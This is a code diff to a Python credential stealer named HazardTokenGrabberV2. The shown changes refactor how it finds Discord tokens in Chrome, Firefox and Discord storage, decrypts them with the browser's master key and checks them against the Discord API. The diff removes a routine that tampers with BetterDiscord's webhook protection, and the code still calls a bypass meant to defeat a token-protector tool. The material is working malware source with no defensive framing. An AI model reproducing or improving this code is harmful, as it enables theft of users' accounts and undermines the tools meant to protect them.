@@ -3,7 +3,6 @@ import json
 import ntpath
 import os
 import re
-import threading
 from base64 import b64decode
 import httpx
 from Crypto.Cipher import AES
@@ -58,7 +57,6 @@ class HazardTokenGrabberV2(Functions):
         self.roaming = os.getenv("appdata")
         self.chrome_user_data = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
 
-        self.hook_reg = "api/webhooks"
         self.chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
@@ -76,7 +74,7 @@ class HazardTokenGrabberV2(Functions):
                 pass
         return wrapper
 
-    async def checkToken(self, tkn: str) -> str:
+    def checkToken(self, tkn: str) -> str:
         try:
             r = httpx.get(
                 url=self.discordApi,
@@ -87,25 +85,17 @@ class HazardTokenGrabberV2(Functions):
             pass
         if r.status_code == 200 and tkn not in self.tokens:
             self.tokens.append(tkn)
+            return True
 
 
     async def init(self):
-        await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
 
-        function_list = [self.grab_tokens]
-        
-        for func in function_list:
-            process = threading.Thread(target=func, daemon=True)
-            process.start()
-        for t in threading.enumerate():
-            try:
-                t.join()
-            except RuntimeError:
-                continue
+        self.grab_tokens()
+
         global tokens
         tokens = self.tokens
-        
+
 
     async def bypassTokenProtector(self):
         # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
@@ -143,16 +133,6 @@ class HazardTokenGrabberV2(Functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
-
-    async def bypassBetterDiscord(self):
-        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
-        if ntpath.exists(bd):
-            x = self.hook_reg
-            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
-                txt = f.read()
-                content = txt.replace(x, 'RdimoTheGoat')
-            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
-                f.write(content)
 
     @try_extract
     def grab_tokens(self):
@@ -193,14 +173,16 @@ class HazardTokenGrabberV2(Functions):
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
                                 token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
-                                asyncio.run(self.checkToken(token))
+                                if self.checkToken(token):
+                                    return
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            asyncio.run(self.checkToken(token))
+                            if self.checkToken(token):
+                                return
 
         if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -209,7 +191,7 @@ class HazardTokenGrabberV2(Functions):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            asyncio.run(self.checkToken(token))
+                            self.checkToken(token)
 
 
 
